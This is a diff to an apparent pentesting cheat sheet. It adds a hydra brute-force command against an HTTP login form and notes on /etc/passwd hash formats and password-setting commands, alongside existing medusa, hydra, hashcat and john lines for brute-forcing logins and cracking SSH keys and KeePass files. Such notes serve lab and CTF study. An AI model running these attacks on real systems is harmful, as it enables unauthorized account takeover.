@@ -51,6 +51,11 @@ medusa -h ip -u admin -P passwords.txt -M http -m DIR:/admin -T 20
 hydra  -l admin -P pass.txt -v ip ftp
 ```
 
+## HTTP Post
+```
+hydra -l none -P rockyou.txt 10.10.10.43 http-post-form
+"/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
+```
 ## Basic Auth
 ```
 cewl example.com -m 6 -w /root/mega-cewl.txt 2> /dev/null
@@ -68,16 +73,66 @@ oclHashcat input file should be in format: `passwordhash:salt`
 oclHashcat-plus64.bin -m 110 hashes.txt ../big-wordlist --force
 ```
 
-# RSA Private Key Password Recovery
+## RSA Private Key Password Recovery
 
 ```
 ssh2john id_rsa > id_john
 john id_john --wordlist=<PATH TO ROCKYOU.TXT>
 ```
 
-# KeePass Password Recovery
+## KeePass Password Recovery
 
 ```
 keepass2john jeeves.kdbx > jeeves.hash
 john jeeves.hash
+```
+
+## /etc/passwrd format
+
+- [Understanding /etc/passwd File Format](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)
+- [Linux Password & Shadow File Formats](https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html)
+- Password Field
+  - Format: `$id$salt$hashed` (`$id$$hashed` means no salt)
+  - `*` account cannot be used to log in
+  - `!!` user doesn't have a password
+  - ` ` user doesn't have a password
+  - `x` password is stored in the shadow file
+  - id
+    - `$1$` is MD5
+    - `$2a$` is Blowfish
+    - `$2y$` is Blowfish
+    - `$5$` is SHA-256
+    - `$6$` is SHA-512
+
+Verify
+```
+pwck -r /etc/passwd
+pwck -r /etc/shadow
+```
+
+Edit
+```
+vipw -p
+vipw -s
+vipw -g
+```
+
+Manually create password
+```
+openssl passwd -1 -salt xyz  yourpass
+makepasswd --clearfrom=- --crypt-md5 <<< YourPass
+mkpasswd  -m sha-512 -s <<< YourPass
+echo -e "md5crypt\npassword" | grub | grep -o "\$1.*"
+perl -e 'use Crypt::PasswdMD5; print unix_md5_crypt("Password", "Salt"),"\n"'
+```
+
+Update password
+```
+echo "username:password" | chpasswd
+```
+```
+perl -e 'print crypt("YourPasswd", "salt"),"\n"'
+echo "username:encryptedPassWd"  | chpasswd -e
+OR
+useradd -p 'encryptedPassWd'  username
 ```
